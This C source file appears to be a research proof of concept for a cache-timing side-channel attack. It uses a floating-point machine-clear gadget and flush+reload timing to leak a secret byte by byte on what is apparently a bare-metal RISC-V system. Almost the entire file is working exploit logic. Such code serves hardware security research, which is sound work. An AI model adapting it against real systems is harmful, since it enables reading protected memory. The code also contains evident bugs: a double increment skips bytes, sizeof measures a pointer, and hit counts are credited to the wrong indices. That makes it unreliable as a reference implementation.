#include "defines.h"
#include "printf.c"
#include "cache.h"
#include <stdint.h>

#define SECRET_SZ 12
#define ATTACK_SAME_ROUNDS 10
#define CACHE_HIT_THRESHOLD 50

#include "pwntools.c"

#define X_VAL   0x0010000000000000
#define Y_VAL   0x4340000000000000

extern uint8_t fp_snippet();
extern const char* secret;
extern const char control;

uint8_t unused1[64*64];
uint8_t reload_buf[256 * L1_BLOCK_SZ_BYTES];
uint8_t unused2[64*64];
static uint64_t results[256];

int main(void){
  uint8_t* secretPtr = &secret;
  uint64_t fp_x = (uint64_t)X_VAL + ((uint64_t)secretPtr - (uint64_t)&control);
  uint64_t fp_y = (uint64_t)Y_VAL;
  int* xPtr = &fp_x;
  int* yPtr = &fp_y;
  printf("Starting...\n\n");
  printf("(fp_x, fp_y) = (0x%x|%x, 0x%x|%x)\n",xPtr[1],xPtr[0],yPtr[1],yPtr[0]);
  for (uint64_t offset = 0; offset < sizeof(secret); ++offset){
    // printf("Searching for secret #%d, addr:0x%x, value(dec):%d, reload_buf:0x%x\n", offset, (uint8_t*)((uint64_t)secretPtr + offset), secretPtr[offset], &reload_buf);
    for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
        results[cIdx] = 0;
    }
    // run the attack on the same idx ATTACK_SAME_ROUNDS times
    for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
        // make sure array you read from is not in the cache
        flushCache((uint64_t)&reload_buf, sizeof(reload_buf));
        
        uint8_t fp_number = fp_snippet(reload_buf, fp_x+offset, fp_y);
        if(fp_number != MAGIC_BYTE) {
            printf("Machine clear failed or non-existent! fp_number:0x%x\n", fp_number);
            return -1;
        }

        uint8_t dummy = 0;
        uint64_t start, diff;
        for (uint64_t i = 0; i < 256; ++i){
            uint64_t mix_i = ((i * 167) + 13) & 255;
            start = get_mcycle();
            dummy &= reload_buf[i*L1_BLOCK_SZ_BYTES];
            diff = (get_mcycle() - start);
            if ( diff < CACHE_HIT_THRESHOLD ){
                results[mix_i] += 1;
            }
        }
    }
    // get highest and second highest result hit values
    uint8_t output[2];
    uint64_t hitArray[2];
    topTwoIdx(results, 256, output, hitArray);
    printf("m[0x%x] = want(%c) =?= guess(hits,dec,char) 1.(%d, %d, %c) 2.(%d, %d, %c)\n", 
        (uint8_t*)((uint64_t)secretPtr + offset),
        secretPtr[offset],
        hitArray[0], output[0], output[0],
        hitArray[1], output[1], output[1]);

    ++offset;
  }

  return 1;
}
